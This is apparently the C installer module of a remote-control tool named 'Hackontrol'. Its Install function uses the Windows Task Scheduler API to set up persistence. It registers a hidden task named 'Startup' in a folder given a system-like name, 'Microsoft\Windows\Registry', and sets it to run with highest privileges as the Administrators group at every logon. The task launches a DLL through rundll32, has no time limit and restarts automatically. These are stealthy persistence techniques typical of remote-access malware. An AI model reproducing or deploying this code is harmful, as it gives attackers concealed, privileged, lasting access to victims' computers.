#include "errorLog.h"
#include <taskschd.h>

#define TASK_FOLDER_NAME L"Microsoft\\Windows\\Registry"
#define RUNDLL32PATH L"System32\\rundll32.exe"

#define TASK_NAME L"Startup"

#define FILE_NAME L"libdll32.dll"
#define FUNCTION_NAME L"Execute"

__declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeEx");
		return;
	}

	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeSecurity");
		goto uninitializeExit;
	}

	ITaskService* taskService = NULL;
	result = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, &taskService);

	if(FAILED(result)) {
		dialogError(result, L"CoCreateInstance");
		goto uninitializeExit;
	}

	VARIANT emptyVariant = {VT_EMPTY};
	result = taskService->lpVtbl->Connect(taskService, emptyVariant, emptyVariant, emptyVariant, emptyVariant);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::Connect");
		goto releaseTaskService;
	}

	ITaskFolder* rootFolder = NULL;
	result = taskService->lpVtbl->GetFolder(taskService, L"\\", &rootFolder);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::GetFolder");
		goto releaseTaskService;
	}

	ITaskFolder* taskFolder = NULL;
	result = rootFolder->lpVtbl->CreateFolder(rootFolder, TASK_FOLDER_NAME, emptyVariant, &taskFolder);

	if(result == 0x800700B7) {
		result = rootFolder->lpVtbl->GetFolder(rootFolder, TASK_FOLDER_NAME, &taskFolder);
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			dialogError(result, L"ITaskFolder::GetFolder");
			goto releaseTaskService;
		}
	} else {
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			dialogError(result, L"ITaskFolder::CreateFolder");
			goto releaseTaskService;
		}
	}

	ITaskDefinition* taskDefinition = NULL;
	result = taskService->lpVtbl->NewTask(taskService, 0, &taskDefinition);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::NewTask");
		goto releaseTaskFolder;
	}
	
	IPrincipal* principal = NULL;
	result = taskDefinition->lpVtbl->get_Principal(taskDefinition, &principal);

	if(FAILED(result)) {
		dialogError(result, L"ITaskDefinition::get_Principal");
		goto releaseTaskDefinition;
	}

	result = principal->lpVtbl->put_RunLevel(principal, TASK_RUNLEVEL_HIGHEST);

	if(FAILED(result)) {
		dialogError(result, L"IPrincipal::put_RunLevel");
		principal->lpVtbl->Release(principal);
		goto releaseTaskDefinition;
	}

	result = principal->lpVtbl->put_UserId(principal, L"S-1-5-32-544");

	if(FAILED(result)) {
		dialogError(result, L"IPrincipal::put_UserId");
		principal->lpVtbl->Release(principal);
		goto releaseTaskDefinition;
	}

	principal->lpVtbl->Release(principal);
	ITriggerCollection* triggerCollection = NULL;
	result = taskDefinition->lpVtbl->get_Triggers(taskDefinition, &triggerCollection);

	if(FAILED(result)) {
		dialogError(result, L"ITaskDefinition::get_Triggers");
		goto releaseTaskDefinition;
	}

	ITrigger* trigger = NULL;
	result = triggerCollection->lpVtbl->Create(triggerCollection, TASK_TRIGGER_LOGON, &trigger);
	triggerCollection->lpVtbl->Release(triggerCollection);

	if(FAILED(result)) {
		dialogError(result, L"ITriggerCollection::Create");
		goto releaseTaskDefinition;
	}

	trigger->lpVtbl->Release(trigger);
	UINT directoryLength = GetWindowsDirectoryW(NULL, 0);

	if(!directoryLength) {
		dialogError(GetLastError(), L"GetWindowsDirectoryW");
		goto releaseTaskDefinition;
	}

	wchar_t* windowsBuffer = malloc(directoryLength * sizeof(wchar_t));

	if(!windowsBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		goto releaseTaskDefinition;
	}

	directoryLength = GetWindowsDirectoryW(windowsBuffer, directoryLength);

	if(!directoryLength) {
		dialogError(GetLastError(), L"GetWindowsDirectoryW");
		free(windowsBuffer);
		goto releaseTaskDefinition;
	}

	size_t fileNameLength = wcslen(RUNDLL32PATH);
	int notEndWithBackslash = windowsBuffer[directoryLength - 1] != L'\\';
	size_t rundll32PathBufferSize = directoryLength + fileNameLength + notEndWithBackslash + 1;
	wchar_t* rundll32PathBuffer = malloc(rundll32PathBufferSize * sizeof(wchar_t));

	if(!rundll32PathBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		free(windowsBuffer);
		goto releaseTaskDefinition;
	}

	for(size_t i = 0; i < directoryLength; i++) {
		rundll32PathBuffer[i] = windowsBuffer[i];
	}

	free(windowsBuffer);

	if(notEndWithBackslash) {
		rundll32PathBuffer[directoryLength] = L'\\';
	}

	for(size_t i = 0; i < fileNameLength; i++) {
		rundll32PathBuffer[i + directoryLength + notEndWithBackslash] = RUNDLL32PATH[i];
	}

	rundll32PathBuffer[rundll32PathBufferSize - 1] = 0;
	fileNameLength = wcslen(FILE_NAME);
	size_t functionNameLength = wcslen(FUNCTION_NAME);
	size_t functionBufferSize = fileNameLength + 1 + functionNameLength + 1;
	wchar_t* functionBuffer = malloc(functionBufferSize * sizeof(wchar_t));

	if(!functionBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		goto freeRundll32PathBuffer;
	}

	for(size_t i = 0; i < fileNameLength; i++) {
		functionBuffer[i] = FILE_NAME[i];
	}
	
	functionBuffer[fileNameLength] = L',';

	for(size_t i = 0; i < functionNameLength; i++) {
		functionBuffer[i + fileNameLength + 1] = FUNCTION_NAME[i];
	}

	functionBuffer[functionBufferSize - 1] = 0;
	IActionCollection* actionCollection = NULL;
	result = taskDefinition->lpVtbl->get_Actions(taskDefinition, &actionCollection);

	if(FAILED(result)) {
		dialogError(result, L"ITaskDefinition::get_Actions");
		goto freeFunctionBuffer;
	}

	IAction* action = NULL;
	result = actionCollection->lpVtbl->Create(actionCollection, TASK_ACTION_EXEC, &action);
	actionCollection->lpVtbl->Release(actionCollection);

	if(FAILED(result)) {
		dialogError(result, L"IActionCollection::Create");
		goto freeFunctionBuffer;
	}

	IExecAction* executeAction = NULL;
	result = action->lpVtbl->QueryInterface(action, &IID_IExecAction, &executeAction);
	action->lpVtbl->Release(action);

	if(FAILED(result)) {
		dialogError(result, L"IAction::QueryInterface");
		goto freeFunctionBuffer;
	}

	result = executeAction->lpVtbl->put_Path(executeAction, rundll32PathBuffer);

	if(FAILED(result)) {
		dialogError(result, L"IExecAction::put_Path");
		executeAction->lpVtbl->Release(executeAction);
		goto freeFunctionBuffer;
	}

	result = executeAction->lpVtbl->put_Arguments(executeAction, functionBuffer);
	executeAction->lpVtbl->Release(executeAction);

	if(FAILED(result)) {
		dialogError(result, L"IExecAction::put_Arguments");
		goto freeFunctionBuffer;
	}
	
	ITaskSettings* taskSettings = NULL;
	result = taskDefinition->lpVtbl->get_Settings(taskDefinition, &taskSettings);

	if(FAILED(result)) {
		dialogError(result, L"ITaskDefinition::get_Settings");
		goto freeFunctionBuffer;
	}

	result = taskSettings->lpVtbl->put_AllowDemandStart(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_AllowDemandStart");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_RestartInterval(taskSettings, L"PT1M");

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_RestartInterval");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_RestartCount(taskSettings, 5);

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_RestartCount");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_ExecutionTimeLimit(taskSettings, L"PT0M");

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_ExecutionTimeLimit");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_DisallowStartIfOnBatteries(taskSettings, VARIANT_FALSE);

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_DisallowStartIfOnBatteries");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_StopIfGoingOnBatteries(taskSettings, VARIANT_FALSE);

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_RunOnlyIfNetworkAvailable(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_RunOnlyIfNetworkAvailable");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_Hidden(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		dialogError(result, L"ITaskSettings::put_Hidden");
		goto releaseTaskSettings;
	}
	
	taskFolder->lpVtbl->DeleteTask(taskFolder, TASK_NAME, 0);
	IRegisteredTask* task = NULL;
	result = taskFolder->lpVtbl->RegisterTaskDefinition(taskFolder, TASK_NAME, taskDefinition, TASK_CREATE_OR_UPDATE, emptyVariant, emptyVariant, TASK_LOGON_GROUP, emptyVariant, &task);

	if(FAILED(result)) {
		dialogError(result, L"ITaskFolder::RegisterTaskDefinition");
		goto releaseTaskSettings;
	}

	MessageBoxW(NULL, L"Hackontrol successfully installed on your machine", L"Hackontrol Installer", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	IRunningTask* runningTask = NULL;
	result = task->lpVtbl->Run(task, emptyVariant, &runningTask);
	task->lpVtbl->Release(task);

	if(FAILED(result)) {
		dialogError(result, L"IRegisteredTask::Run");
		goto releaseTaskSettings;
	}

	runningTask->lpVtbl->Release(runningTask);
releaseTaskSettings:
	taskSettings->lpVtbl->Release(taskSettings);
freeFunctionBuffer:
	free(functionBuffer);
freeRundll32PathBuffer:
	free(rundll32PathBuffer);
releaseTaskDefinition:
	taskDefinition->lpVtbl->Release(taskDefinition);
releaseTaskFolder:
	taskFolder->lpVtbl->Release(taskFolder);
releaseTaskService:
	taskService->lpVtbl->Release(taskService);
uninitializeExit:
	CoUninitialize();
}
